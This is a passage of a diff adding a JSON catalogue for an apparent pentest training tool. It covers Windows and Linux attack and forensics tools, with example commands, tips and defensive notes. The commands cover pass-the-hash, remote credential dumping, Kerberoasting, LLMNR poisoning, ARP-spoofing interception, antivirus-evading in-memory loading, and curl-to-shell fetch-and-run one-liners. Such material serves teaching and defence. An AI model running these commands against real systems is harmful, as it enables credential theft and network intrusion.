+      "-u":   { "label": "Username", "desc": "Windows username for authentication.", "example": "evil-winrm -i 192.168.1.1 -u administrator -p password", "teach": "Any user with WinRM access works. Local admins, domain admins, and users in the Remote Management Users group.", "risk": "noisy" },
+      "-p":   { "label": "Password", "desc": "Plaintext password.", "example": "evil-winrm -i 192.168.1.1 -u admin -p 'P@ssw0rd!'", "teach": "Plaintext password authentication. If you have an NTLM hash instead, use -H for Pass the Hash.", "risk": "noisy" },
+      "-H":   { "label": "NT Hash (Pass the Hash)", "desc": "Authenticate using NTLM hash instead of plaintext password.", "example": "evil-winrm -i 192.168.1.1 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", "teach": "Pass the Hash — no password needed! Dump the NTLM hash with mimikatz or secretsdump, pass it directly here. No cracking required.", "risk": "very_noisy" },
+      "-s":   { "label": "PS Scripts Path", "desc": "Path to PowerShell scripts to load in memory.", "example": "evil-winrm -i 192.168.1.1 -u admin -p password -s /opt/PowerSploit/", "teach": "Scripts are loaded into memory without touching disk. Invoke-Mimikatz, PowerView, AMSI bypass scripts — all available via tab completion.", "risk": "very_noisy" },
+      "-e":   { "label": ".NET Executables Path", "desc": "Path to .NET executables to load via Invoke-Binary.", "example": "evil-winrm -i 192.168.1.1 -u admin -p password -e /opt/sharp_tools/", "teach": "Load SharpHound, Rubeus, SafetyKatz entirely in memory using Invoke-Binary. Never touches disk — bypasses AV file scanning.", "risk": "very_noisy" }
+    },
+    "preset_profiles": {
+      "Password Auth":  { "flags": ["-i", "{target}", "-u", "administrator", "-p", "PASSWORD"], "desc": "Connect with plaintext credentials." },
+      "Pass the Hash":  { "flags": ["-i", "{target}", "-u", "administrator", "-H", "NTLM_HASH"], "desc": "Connect using NTLM hash — no password needed." },
+      "With Scripts":   { "flags": ["-i", "{target}", "-u", "administrator", "-p", "PASSWORD", "-s", "/opt/privesc_scripts/"], "desc": "Connect and load PS scripts in memory." }
+    },
+    "defend_notes": "Restrict WinRM access via firewall rules — only allow from specific management hosts. Monitor Event 4624 (logon type 3) and PowerShell ScriptBlock logging (Event 4104). Credential Guard blocks Pass the Hash. Enable PowerShell Constrained Language Mode to limit what attackers can do in a WinRM session. Log all WinRM connections in your SIEM.",
+    "mitre_techniques": ["T1021.006 - Remote Services: Windows Remote Management", "T1550.002 - Use Alternate Authentication Material: Pass the Hash"]
+  },
+
+  "impacket": {
+    "name": "Impacket",
+    "binary": "impacket-secretsdump",
+    "category": "post_exploit",
+    "description": "Python library and collection of tools for Windows protocol attacks. Key tools: secretsdump (dump hashes), psexec (remote shell), wmiexec (WMI shell), smbclient (browse shares), GetUserSPNs (Kerberoasting), GetNPUsers (AS-REP roasting).",
+    "teach_intro": "Impacket is the go-to toolkit for Windows Active Directory attacks from Linux. No need to run anything on Windows — attack directly from Kali. secretsdump dumps hashes remotely, psexec gives shells, and Kerberoasting extracts crackable service account hashes without touching the DC.",
+    "default_command": "impacket-secretsdump domain/user:password@{target}",
+    "flags": {
+      "secretsdump":   { "label": "Dump Secrets Remotely", "desc": "Remotely dump SAM/NTDS hashes via SMB without running anything on target.", "example": "impacket-secretsdump corp.local/admin:password@192.168.1.1", "teach": "secretsdump connects via SMB, reads the SAM database remotely, and dumps all NTLM hashes. On a DC: dumps the entire NTDS.dit — every domain account hash.", "risk": "very_noisy" },
+      "psexec":        { "label": "PSExec Remote Shell", "desc": "Get an interactive shell via SMB service creation.", "example": "impacket-psexec corp.local/admin:password@192.168.1.1", "teach": "psexec creates a temporary service on the target and gives you a SYSTEM shell. Very loud — creates services, writes files. Detected by AV/EDR but effective on legacy systems.", "risk": "very_noisy" },
+      "wmiexec":       { "label": "WMI Remote Shell", "desc": "Execute commands via WMI. Fileless and stealthier than psexec.", "example": "impacket-wmiexec corp.local/admin:password@192.168.1.1", "teach": "WMI execution is semi-interactive and doesn't write files to disk. Much stealthier than psexec. Output comes back via SMB share.", "risk": "noisy" },
+      "GetUserSPNs":   { "label": "Kerberoasting", "desc": "Request service tickets for accounts with SPNs and extract for offline cracking.", "example": "impacket-GetUserSPNs corp.local/user:password -dc-ip 192.168.1.1 -request", "teach": "Kerberoasting: request a service ticket, extract the TGS hash, crack offline with hashcat -m 13100. Service accounts often have weak passwords and high privileges.", "risk": "noisy" },
+      "GetNPUsers":    { "label": "AS-REP Roasting", "desc": "Get crackable hashes for accounts with pre-auth disabled (no creds needed).", "example": "impacket-GetNPUsers corp.local/ -dc-ip 192.168.1.1 -usersfile users.txt -no-pass", "teach": "AS-REP roasting requires NO credentials. Accounts with 'Do not require Kerberos preauthentication' return a crackable hash. Crack with hashcat -m 18200.", "risk": "quiet" },
+      "smbclient":     { "label": "SMB Client", "desc": "Browse and interact with SMB shares from Linux.", "example": "impacket-smbclient corp.local/user:password@192.168.1.1", "teach": "Interactive SMB shell. List shares, download files, upload backdoors. Like FTP but for Windows file shares.", "risk": "noisy" }
+    },
+    "preset_profiles": {
+      "Dump Hashes":    { "flags": ["impacket-secretsdump", "DOMAIN/user:pass@{target}"], "desc": "Remote credential dump via SMB." },
+      "Kerberoast":     { "flags": ["impacket-GetUserSPNs", "DOMAIN/user:pass", "-dc-ip", "{target}", "-request", "-outputfile", "tgs_hashes.txt"], "desc": "Extract Kerberoastable service account hashes." },
+      "AS-REP Roast":   { "flags": ["impacket-GetNPUsers", "DOMAIN/", "-dc-ip", "{target}", "-usersfile", "users.txt", "-no-pass", "-format", "hashcat"], "desc": "AS-REP roasting — no credentials needed." },
+      "WMI Shell":      { "flags": ["impacket-wmiexec", "DOMAIN/admin:PASS@{target}"], "desc": "Semi-interactive WMI shell." }
+    },
+    "defend_notes": "Kerberoasting is hard to prevent since requesting service tickets is normal. Mitigate by using Managed Service Accounts (MSAs) with auto-rotating passwords, or Group Managed Service Accounts (gMSAs). Monitor for excessive TGS requests (many tickets in short time) in Event 4769. AS-REP roasting prevention: require pre-authentication for all accounts (never enable 'Do not require Kerberos preauthentication').",
+    "mitre_techniques": ["T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting", "T1558.004 - AS-REP Roasting", "T1003.002 - OS Credential Dumping: SAM"]
+  },
+
+  "linpeas": {
+    "name": "LinPEAS",
+    "binary": "linpeas.sh",
+    "category": "post_exploit",
+    "description": "Linux Privilege Escalation Awesome Script. Automatically searches for privilege escalation vectors on Linux: SUID/SGID binaries, sudo misconfigs, writable paths, cron jobs, kernel exploits, interesting files, network info, and hundreds more checks.",
+    "teach_intro": "After getting a low-privilege shell, your goal is root. LinPEAS does the recon for you — it runs 300+ checks looking for every known Linux privesc vector. Color-coded output: red/yellow = high priority finding. Start at the red output and work your way down.",
+    "default_command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    "flags": {
+      "-a":    { "label": "All Checks (thorough)", "desc": "Run all checks including slower network checks.", "example": "linpeas.sh -a", "teach": "More thorough but slower. -a adds network enumeration and extra checks. Use when you have time and a stable shell.", "risk": "safe" },
+      "-q":    { "label": "Quiet Mode", "desc": "Don't show banner and don't ask questions.", "example": "linpeas.sh -q", "teach": "Quieter output. Use when you want clean text for logging or when running via a script.", "risk": "safe" },
+      "-o":    { "label": "Output to File", "desc": "Save results to a file for later review.", "example": "linpeas.sh -o /tmp/linpeas_out.txt", "teach": "Save output! LinPEAS results are your roadmap. Review offline without the time pressure of an active shell.", "risk": "safe" },
+      "SUID":  { "label": "SUID Binaries", "desc": "Focus area: binaries with SUID bit set run as owner (often root).", "example": "find / -perm -4000 -type f 2>/dev/null", "teach": "SUID binaries run as the file's owner regardless of who executes them. If root owns a SUID binary with a shell escape, you get root. Check GTFOBins for escape techniques.", "risk": "safe" },
+      "Sudo":  { "label": "Sudo Misconfigs", "desc": "Focus area: sudo rules that allow privesc.", "example": "sudo -l", "teach": "sudo -l shows what you can run as root. 'NOPASSWD: /usr/bin/vim' → vim with :!bash = root shell. Check every allowed command on GTFOBins.", "risk": "safe" },
+      "Cron":  { "label": "Cron Job Analysis", "desc": "Focus area: writable scripts run by root's crontab.", "example": "cat /etc/crontab && ls -la /etc/cron*", "teach": "If root runs a script you can write to, you own root. Check crontab entries and look for writable scripts or PATH components that you can hijack.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Quick Run":      { "flags": ["-q"], "desc": "Fast quiet run — no banner." },
+      "Full Run":       { "flags": ["-a", "-o", "/tmp/linpeas_results.txt"], "desc": "Thorough all-checks run, save to file." },
+      "One-Liner":      { "flags": ["curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash"], "desc": "Fetch and run in one command." }
+    },
+    "defend_notes": "LinPEAS findings are actual vulnerabilities you must fix. Key remediations: audit SUID binaries (remove unnecessary SUID bits), review sudo rules (use specific paths, avoid NOPASSWD for interpreters), lock down cron job permissions (scripts should be root-owned and not world-writable), patch kernel CVEs, disable dangerous capabilities.",
+    "mitre_techniques": ["T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid", "T1053.003 - Scheduled Task/Job: Cron"]
+  },
+
+  "winpeas": {
+    "name": "WinPEAS",
+    "binary": "winpeas.exe",
+    "category": "post_exploit",
+    "description": "Windows Privilege Escalation Awesome Script. Automates enumeration of Windows privesc vectors: service misconfigs, unquoted service paths, AlwaysInstallElevated, token privileges, auto-logon credentials, stored credentials, and registry checks.",
+    "teach_intro": "After landing on a Windows box as a low-priv user, WinPEAS finds your escalation path. It checks 200+ Windows-specific attack vectors. Color-coded like LinPEAS: red and yellow are your priorities. Common wins: SeImpersonatePrivilege (Potato attacks), unquoted service paths, weak service permissions.",
+    "default_command": "winpeas.exe",
+    "flags": {
+      "systeminfo":   { "label": "System Information", "desc": "Enumerate OS version, patches, hotfixes.", "example": "winpeas.exe systeminfo", "teach": "Missing patches = kernel/service exploits. Note the Windows build number and check against known unpatched CVEs.", "risk": "safe" },
+      "servicesinfo": { "label": "Services Enumeration", "desc": "Check for vulnerable service configurations.", "example": "winpeas.exe servicesinfo", "teach": "Unquoted service paths with spaces are a classic privesc: C:\\Program Files\\My App\\service.exe — place malicious binary at C:\\Program.exe and restart the service.", "risk": "safe" },
+      "applicationsinfo":{ "label": "Applications", "desc": "List installed software and look for vulnerable versions.", "example": "winpeas.exe applicationsinfo", "teach": "Old software versions = known exploits. Installed security software tells you what you're up against. DLL hijacking opportunities in software directories.", "risk": "safe" },
+      "userinfo":     { "label": "User Info", "desc": "Enumerate users, groups, token privileges.", "example": "winpeas.exe userinfo", "teach": "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege → Potato attacks (JuicyPotato, PrintSpoofer, GodPotato). SeBackupPrivilege → read any file. SeDebugPrivilege → process injection.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Full Scan":      { "flags": [""], "desc": "Run all WinPEAS checks (no args = everything)." },
+      "Quick":          { "flags": ["fast"], "desc": "Faster scan, skip slow checks." }
+    },
+    "defend_notes": "Fix the findings WinPEAS surfaces: use quoted paths in service configurations, review service permissions (never grant write to Everyone), disable AlwaysInstallElevated GPO, apply patches, restrict token privileges. Implement Windows Defender Application Control (WDAC) to prevent unauthorized executable runs. Regular vulnerability scanning catches these configurations.",
+    "mitre_techniques": ["T1548.002 - Abuse Elevation Control Mechanism: Bypass UAC", "T1134 - Access Token Manipulation"]
+  },
+
+  "volatility3": {
+    "name": "Volatility 3",
+    "binary": "vol",
+    "category": "forensics",
+    "description": "The leading open-source memory forensics framework. Analyzes RAM dumps to extract: running processes, network connections, loaded DLLs, command history, encryption keys, passwords in memory, injected code, rootkits, and more.",
+    "teach_intro": "Memory forensics is like an X-ray of a running system at a moment in time. Every running process, open network connection, encryption key, and typed command exists in RAM. Volatility reads a memory dump (or live memory) and lets you query all of this data without running anything on the victim machine.",
+    "default_command": "vol -f {target} windows.pslist",
+    "flags": {
+      "-f":           { "label": "Memory Image File", "desc": "Path to memory dump file (.raw, .vmem, .dmp, .mem).", "example": "vol -f memory.raw windows.pslist", "teach": "Memory dumps are taken with FTK Imager, WinPMem, or VM snapshot files. The .vmem file from VMware is directly readable by Volatility.", "risk": "safe" },
+      "windows.pslist":{ "label": "Process List", "desc": "List running processes from the process list.", "example": "vol -f memory.raw windows.pslist", "teach": "Shows all running processes with PID, PPID, name, and timestamps. Look for unusual processes, unusual parents (cmd.exe spawned by Word = malware), and process names that mimic legit ones.", "risk": "safe" },
+      "windows.pstree":{ "label": "Process Tree", "desc": "Display processes in parent-child tree format.", "example": "vol -f memory.raw windows.pstree", "teach": "Tree view reveals injection chains. powershell.exe under winword.exe is a macro payload. cmd.exe under explorer.exe is suspicious. Know the normal Windows process tree.", "risk": "safe" },
+      "windows.netstat":{ "label": "Network Connections", "desc": "List active and recent network connections.", "example": "vol -f memory.raw windows.netstat", "teach": "Shows C2 connections even after the process closed the socket (sockets linger in memory). Maps process PID to network connections — identifies the C2 process.", "risk": "safe" },
+      "windows.dlllist":{ "label": "DLL List", "desc": "List DLLs loaded by each process.", "example": "vol -f memory.raw windows.dlllist --pid 1234", "teach": "Injected DLLs show up here. Unknown DLLs in system processes, DLLs loaded from temp directories, or DLLs with no path (reflective injection) are all red flags.", "risk": "safe" },
+      "windows.cmdline":{ "label": "Command Lines", "desc": "Show command-line arguments for all processes.", "example": "vol -f memory.raw windows.cmdline", "teach": "Reveals what commands were run to launch each process. Powershell.exe with base64 encoded arguments = encoded malware. certutil.exe downloading files is a classic LOLBin.", "risk": "safe" },
+      "windows.malfind":{ "label": "Malware Finder", "desc": "Find injected code and hidden processes using heuristics.", "example": "vol -f memory.raw windows.malfind", "teach": "malfind looks for memory regions that are executable but not backed by a file — the signature of shellcode injection. Dumps suspicious regions for further analysis.", "risk": "safe" },
+      "windows.hashdump":{ "label": "Dump Password Hashes", "desc": "Extract NTLM password hashes from memory.", "example": "vol -f memory.raw windows.hashdump", "teach": "Like mimikatz but offline from a memory dump. Extracts SAM hashes from SYSTEM and SAM hive memory — crack with hashcat.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Triage":         { "flags": ["-f", "{target}", "windows.pslist"], "desc": "Quick process list — first triage step." },
+      "Network":        { "flags": ["-f", "{target}", "windows.netstat"], "desc": "Check network connections for C2." },
+      "Malware Hunt":   { "flags": ["-f", "{target}", "windows.malfind"], "desc": "Hunt for injected code and hidden malware." },
+      "Full Triage":    { "flags": ["-f", "{target}", "windows.pslist && vol -f {target} windows.netstat && vol -f {target} windows.cmdline"], "desc": "Full incident response triage." }
+    },
+    "defend_notes": "Memory forensics is your best tool for detecting advanced threats that live only in RAM. Implement: regular memory dumps as part of your IR playbook, endpoint agents that capture memory on anomaly detection, and blue team training on interpreting Volatility output. EDR tools like CrowdStrike Falcon do live memory inspection automatically.",
+    "mitre_techniques": ["T1003.001 - OS Credential Dumping: LSASS Memory", "T1055 - Process Injection"]
+  },
+
+  "autopsy": {
+    "name": "Autopsy",
+    "binary": "autopsy",
+    "category": "forensics",
+    "description": "Open-source digital forensics platform. Analyzes disk images, file systems, and mobile devices. Recovers deleted files, extracts artifacts (web history, emails, documents), timestamps, and builds timelines. Used by law enforcement and incident responders worldwide.",
+    "teach_intro": "Autopsy is the GUI layer over The Sleuth Kit. When you have a disk image from a compromised system, Autopsy carves through it to find deleted files, recover artifacts, and build a timeline of activity. It's used for both offensive intelligence gathering and defensive incident response.",
+    "default_command": "autopsy",
+    "flags": {
+      "File Recovery":  { "label": "Deleted File Recovery", "desc": "Recover deleted files from disk images.", "example": "Open case → Add data source → Enable file recovery module", "teach": "Files are 'deleted' but the data stays on disk until overwritten. Autopsy recovers them. Deleted malware, wiped logs, erased documents — all potentially recoverable.", "risk": "safe" },
+      "Web Artifacts":  { "label": "Browser History", "desc": "Extract browser history, downloads, cookies, cached images.", "example": "Open case → Run Recent Activity module", "teach": "Browser artifacts reveal attacker research: what sites they visited before the attack, C2 infrastructure they accessed, tools they downloaded.", "risk": "safe" },
+      "Timeline":       { "label": "Timeline Analysis", "desc": "Build a chronological timeline of file system activity.", "example": "Open case → Timeline Analysis tab", "teach": "Timeline shows exactly when files were created, modified, and accessed. Correlate with attack timestamps to build the kill chain narrative.", "risk": "safe" },
+      "Keyword Search": { "label": "Keyword Search", "desc": "Search disk image for specific strings: passwords, IPs, domains.", "example": "Open case → Keyword Search → enter terms", "teach": "Search for C2 domains, malware hashes, victim data, or keywords from the investigation. Even encrypted files often have metadata or strings that match.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Launch GUI":     { "flags": [""], "desc": "Launch Autopsy GUI. Create new case via interface." }
+    },
+    "defend_notes": "Forensics is the defensive side — collect and preserve evidence. Implement: centralized logging before an incident, full disk encryption complicates recovery (good for defense, bad for offense), integrity monitoring to detect unauthorized changes, and incident response plans that include immediate disk imaging before remediation.",
+    "mitre_techniques": ["T1005 - Data from Local System", "T1070 - Indicator Removal"]
+  },
+
+  "theHarvester": {
+    "name": "theHarvester",
+    "binary": "theHarvester",
+    "category": "osint",
+    "description": "OSINT gathering tool for email addresses, subdomains, IPs, URLs, and employee names. Queries search engines (Google, Bing, DuckDuckGo), social media, Shodan, VirusTotal, and dozens more. Pre-engagement recon gold.",
+    "teach_intro": "theHarvester searches public sources for information about a target organization. Before you touch a single system, you can find email addresses (for phishing), subdomains (attack surface), employee names (social engineering), and IP ranges. All completely passive and legal.",
+    "default_command": "theHarvester -d {target} -l 500 -b all",
+    "flags": {
+      "-d":   { "label": "Target Domain", "desc": "Domain to search for: -d target.com", "example": "theHarvester -d target.com -l 500 -b google", "teach": "Your target domain is the seed. theHarvester finds everything publicly associated with it — emails, subdomains, employee names.", "risk": "quiet" },
+      "-b":   { "label": "Data Sources", "desc": "Which sources to query: google, bing, shodan, virustotal, all", "example": "theHarvester -d target.com -b all", "teach": "'all' queries every available source. Individual sources: shodan finds exposed services, virustotal finds subdomains, linkedin finds employees (for social engineering).", "risk": "quiet" },
+      "-l":   { "label": "Result Limit", "desc": "Limit results per source: -l 500", "example": "theHarvester -d target.com -l 500 -b google", "teach": "More results = more complete picture. 500 is a good starting point. Increase for large organizations.", "risk": "quiet" },
+      "-f":   { "label": "Output File", "desc": "Save results to HTML and XML: -f output_file", "example": "theHarvester -d target.com -b all -f results", "teach": "HTML output is readable, XML is machine-parseable. Always save — you'll reference these findings throughout the engagement.", "risk": "safe" },
+      "-v":   { "label": "Verify Hosts", "desc": "Verify found hosts via DNS resolution.", "example": "theHarvester -d target.com -b all -v", "teach": "Resolves found subdomains to confirm they're live. Dead subdomains are less interesting than live ones.", "risk": "quiet" }
+    },
+    "preset_profiles": {
+      "Full OSINT":     { "flags": ["-d", "{target}", "-l", "500", "-b", "all", "-f", "harvester_results"], "desc": "Query all sources, save HTML/XML report." },
+      "Quick Sweep":    { "flags": ["-d", "{target}", "-l", "200", "-b", "google,bing,virustotal"], "desc": "Fast sweep of most useful sources." }
+    },
+    "defend_notes": "Passive OSINT is invisible to you — you cannot detect theHarvester queries since it hits public search engines, not your infrastructure. Reduce your exposure: implement email obfuscation, use private WHOIS registration, monitor LinkedIn for employee over-disclosure, and subscribe to breach notification services for your domain.",
+    "mitre_techniques": ["T1589 - Gather Victim Identity Information", "T1591 - Gather Victim Org Information"]
+  },
+
+  "maltego": {
+    "name": "Maltego",
+    "binary": "maltego",
+    "category": "osint",
+    "description": "Visual intelligence gathering and link analysis platform. Transforms data about organizations, people, domains, and infrastructure into interactive graph visualizations. Shows hidden relationships between data points. Industry standard for OSINT graph analysis.",
+    "teach_intro": "Maltego builds a visual graph of connections. Start with a domain → transforms find associated IPs, email addresses, people → those people have social media → their connections reveal other targets. It's like Palantir but for pentesters. The graph view makes complex relationships obvious at a glance.",
+    "default_command": "maltego",
+    "flags": {
+      "Transforms":    { "label": "Run Transforms", "desc": "Automated OSINT lookups called transforms. Right-click any node to run transforms against it.", "example": "Right-click domain → Run Transform → DNS from Domain", "teach": "Each transform queries a different data source and adds new nodes to the graph. Chain transforms: domain → subdomains → IPs → ASN → other domains on same ASN.", "risk": "quiet" },
+      "Machine":       { "label": "Machine Mode", "desc": "Automated transform chains that run multiple queries sequentially.", "example": "Machines tab → Company Stalker → enter target domain", "teach": "Machines are automated investigation workflows. 'Company Stalker' finds email addresses, people, and social profiles automatically. 'Footprint L1' does basic infrastructure mapping.", "risk": "quiet" }
+    },
+    "preset_profiles": {
+      "Launch GUI":     { "flags": [""], "desc": "Launch Maltego CE GUI. Free version available with registration." }
+    },
+    "defend_notes": "Like theHarvester, Maltego queries are passive and invisible. Defense is reducing your information footprint in public databases: private WHOIS, minimal LinkedIn disclosure, monitoring for leaked credentials in paste sites (HaveIBeenPwned Enterprise), and certificate transparency monitoring.",
+    "mitre_techniques": ["T1590 - Gather Victim Network Information", "T1591 - Gather Victim Org Information"]
+  },
+
+  "shodan": {
+    "name": "Shodan CLI",
+    "binary": "shodan",
+    "category": "osint",
+    "description": "Command-line interface for Shodan — the search engine for internet-connected devices. Finds exposed services, default credentials, vulnerable software versions, industrial control systems, cameras, databases, and more. Essential for external attack surface mapping.",
+    "teach_intro": "Shodan continuously scans the entire internet and indexes what it finds. You search it like Google but for devices. 'org:TargetCorp port:3389' finds all of their RDP servers. 'hostname:target.com vuln:CVE-2021-44228' finds their Log4j-vulnerable hosts. It's the fastest way to understand an organization's external exposure.",
+    "default_command": "shodan search 'org:{target}'",
+    "flags": {
+      "search":    { "label": "Search Shodan", "desc": "Query the Shodan database with filters.", "example": "shodan search 'hostname:target.com port:22'", "teach": "Powerful filters: org: (company name), hostname:, port:, os:, product:, version:, country:, vuln: (by CVE). Combine them: 'org:Target Corp port:3389 os:Windows'", "risk": "quiet" },
+      "host":      { "label": "Host Lookup", "desc": "Get all Shodan data for a specific IP.", "example": "shodan host 192.168.1.1", "teach": "Shows every open port, service banner, vulnerabilities, and historical data Shodan has for an IP. Like a passive nmap from Shodan's perspective.", "risk": "quiet" },
+      "stats":     { "label": "Statistics", "desc": "Get statistics about search results.", "example": "shodan stats --facets country,port 'org:Target Corp'", "teach": "See which countries target's servers are in, which ports are most common, what OS versions they run. Great for understanding the overall infrastructure.", "risk": "quiet" },
+      "download":  { "label": "Download Results", "desc": "Download search results to a file.", "example": "shodan download results 'org:Target Corp' && shodan parse results.json.gz", "teach": "Download all matching hosts for offline analysis. Parse with shodan parse to extract IPs, ports, and banners.", "risk": "quiet" },
+      "myip":      { "label": "My IP Address", "desc": "Show your current external IP address.", "example": "shodan myip", "teach": "Quick check of what IP you're appearing as externally. Important for engagement tracking and for verifying VPN/proxy is working.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Org Search":     { "flags": ["search", "'org:{target}'"], "desc": "Find all Shodan data for an organization." },
+      "Vuln Search":    { "flags": ["search", "'hostname:{target} vuln:CVE-2021-44228'"], "desc": "Find Log4j vulnerable hosts." },
+      "Port Scan":      { "flags": ["search", "'hostname:{target}'", "--fields", "ip_str,port,transport,data"], "desc": "Extract all open ports for a domain's hosts." },
+      "RDP Hunt":       { "flags": ["search", "'org:{target} port:3389'"], "desc": "Find exposed RDP servers for an org." }
+    },
+    "defend_notes": "Shodan shows your true internet-facing exposure. Run 'shodan search org:YourCompany' from the defender side regularly — you'll find shadow IT, forgotten servers, and misconfigured services. Use Shodan Monitor to get alerts when new assets appear. Remove unnecessary internet-facing services, use VPNs for admin access instead of exposing RDP/SSH.",
+    "mitre_techniques": ["T1596.005 - Search Open Technical Databases: Scan Databases", "T1590.005 - Gather Victim Network Information: IP Addresses"]
+  },
+
+  "responder": {
+    "name": "Responder",
+    "binary": "responder",
+    "category": "network_attacks",
+    "description": "LLMNR/NBT-NS/mDNS poisoning tool for credential capture on local networks. When Windows systems fail DNS, they broadcast LLMNR requests — Responder answers them, captures NTLMv2 hashes, and cracks them offline. Also runs rogue SMB, HTTP, FTP, and other servers to capture auth attempts.",
+    "teach_intro": "Windows fails a DNS lookup → broadcasts LLMNR on the local network asking 'who has this name?' → Responder answers 'that's me!' → Windows sends NTLMv2 credentials to authenticate. You capture the NTLMv2 hash and crack it offline. In corporate environments this produces credentials within minutes of running.",
+    "default_command": "responder -I eth0 -rdw",
+    "flags": {
+      "-I":   { "label": "Network Interface", "desc": "Interface to listen on: -I eth0 or -I wlan0", "example": "responder -I eth0", "teach": "Responder listens on your interface and responds to broadcast queries. Must be on the same network segment as victims.", "risk": "very_noisy" },
+      "-r":   { "label": "Enable NBNS", "desc": "Enable NetBIOS Name Service poisoning.", "example": "responder -I eth0 -r", "teach": "NBNS is another Windows name resolution fallback. Combined with LLMNR poisoning you capture more hashes.", "risk": "very_noisy" },
+      "-d":   { "label": "Enable DHCP", "desc": "Enable DHCP poisoning to inject Responder's IP as WPAD proxy.", "example": "responder -I eth0 -d", "teach": "DHCP poisoning injects WPAD configuration pointing to Responder's HTTP server. All browsers that auto-configure proxy send credentials.", "risk": "very_noisy" },
+      "-w":   { "label": "WPAD Server", "desc": "Start a rogue WPAD proxy server.", "example": "responder -I eth0 -w", "teach": "WPAD (Web Proxy Auto-Discovery) tricks browsers into authenticating to your proxy. Transparent credential capture from browser traffic.", "risk": "very_noisy" },
+      "-P":   { "label": "Force NTLMv1", "desc": "Force downgrade from NTLMv2 to NTLMv1 for easier cracking.", "example": "responder -I eth0 -rdw -P", "teach": "NTLMv1 is weaker and cracks much faster than NTLMv2. Some systems accept downgrade, others don't.", "risk": "very_noisy" },
+      "--lm": { "label": "LM Downgrade", "desc": "Enable LM hash downgrade (very old systems).", "example": "responder -I eth0 --lm", "teach": "LM hashes are trivially crackable. Only older Windows systems (XP era) still use them, but some configs still negotiate LM.", "risk": "very_noisy" }
+    },
+    "preset_profiles": {
+      "Full Capture":   { "flags": ["-I", "eth0", "-rdw"], "desc": "Full LLMNR/NBNS/WPAD poisoning — maximum capture." },
+      "LLMNR Only":     { "flags": ["-I", "eth0"], "desc": "LLMNR poisoning only, lowest noise." },
+      "Analyze Mode":   { "flags": ["-I", "eth0", "-A"], "desc": "Analyze mode — listen but don't poison." }
+    },
+    "defend_notes": "Disable LLMNR and NBT-NS via Group Policy — this is the only real fix: Computer Config → Windows Settings → Security Settings → Local Policies → Security Options → 'Network Security: Allow LLMNR' = disabled. Use DNS for all name resolution. Enable SMB signing to prevent relay attacks. Monitor for multiple failed NTLM authentication events from new IPs on your network.",
+    "mitre_techniques": ["T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning", "T1040 - Network Sniffing"]
+  },
+
+  "bettercap": {
+    "name": "Bettercap",
+    "binary": "bettercap",
+    "category": "network_attacks",
+    "description": "The Swiss Army knife of network attacks. Performs ARP spoofing, man-in-the-middle attacks, WiFi hacking, BLE (Bluetooth) sniffing, network discovery, and credential capture. Replaces ettercap with a modern modular architecture.",
+    "teach_intro": "Bettercap positions itself between you and network traffic (MITM). ARP poisoning tricks devices into sending traffic through you. Once in the middle, you see all unencrypted traffic, can inject content into HTTP pages, strip HTTPS (with SSLstrip), or capture credentials from protocols that use plaintext auth.",
+    "default_command": "bettercap -iface eth0",
+    "flags": {
+      "-iface":     { "label": "Network Interface", "desc": "Network interface to use: -iface eth0", "example": "bettercap -iface eth0", "teach": "Specifies your network interface. wlan0 for WiFi MITM, eth0 for wired. Bettercap starts an interactive console.", "risk": "noisy" },
+      "net.probe":  { "label": "Network Probe", "desc": "Discover hosts on the network segment.", "example": "net.probe on", "teach": "Sends ARP/mDNS/UPnP probes to discover all hosts. Shows IP, MAC, hostname, and vendor. Your target list.", "risk": "noisy" },
+      "arp.spoof":  { "label": "ARP Spoofing", "desc": "Perform ARP poisoning to MITM traffic.", "example": "set arp.spoof.targets 192.168.1.5; arp.spoof on", "teach": "Tells victim 'the gateway is at MY MAC address'. All their traffic flows through you. Combine with net.sniff to capture it.", "risk": "very_noisy" },
+      "net.sniff":  { "label": "Network Sniffing", "desc": "Sniff and display/log captured network traffic.", "example": "net.sniff on", "teach": "Captures and parses all traffic. Credentials from HTTP forms, FTP, POP3, IMAP, Telnet — all visible in cleartext.", "risk": "very_noisy" },
+      "https.proxy":{ "label": "HTTPS Proxy / SSLstrip", "desc": "Act as HTTPS proxy for SSL inspection and stripping.", "example": "https.proxy on", "teach": "SSLstrip intercepts HTTPS redirects and serves HTTP instead. User thinks they're on HTTPS but you see plaintext. Modern HSTS protects most sites.", "risk": "very_noisy" },
+      "wifi.recon": { "label": "WiFi Recon", "desc": "Scan and monitor nearby WiFi networks.", "example": "wifi.recon on", "teach": "Shows all APs and clients in range with signal strength, BSSID, encryption type. Foundation for WiFi attacks.", "risk": "noisy" }
+    },
+    "preset_profiles": {
+      "Host Discovery": { "flags": ["-iface", "eth0", "-eval", "'net.probe on'"], "desc": "Discover all hosts on local network." },
+      "MITM Attack":    { "flags": ["-iface", "eth0", "-eval", "'set arp.spoof.targets TARGET_IP; arp.spoof on; net.sniff on'"], "desc": "Full ARP spoof + traffic capture." }
+    },
+    "defend_notes": "Enable Dynamic ARP Inspection (DAI) on managed switches — prevents ARP spoofing at hardware level. Use 802.1X port authentication to verify device identity before network access. Encrypt everything (TLS 1.3). Enable HTTPS Strict Transport Security (HSTS) with preloading to prevent SSL stripping. Deploy network IDS (Snort/Suricata) to detect ARP anomalies.",
+    "mitre_techniques": ["T1557.002 - Adversary-in-the-Middle: ARP Cache Poisoning", "T1040 - Network Sniffing"]
+  },
+
+  "wpscan": {
+    "name": "WPScan",
+    "binary": "wpscan",
+    "category": "web",
+    "description": "Black box WordPress vulnerability scanner. Enumerates WordPress version, installed plugins, themes, users, and checks them all against a database of known vulnerabilities. The definitive tool for WordPress security assessment.",
+    "teach_intro": "WordPress powers 43% of the web. WPScan specifically targets the WordPress ecosystem — outdated plugins are the most common attack vector. A single vulnerable plugin can give you remote code execution regardless of how well the core WordPress installation is secured.",
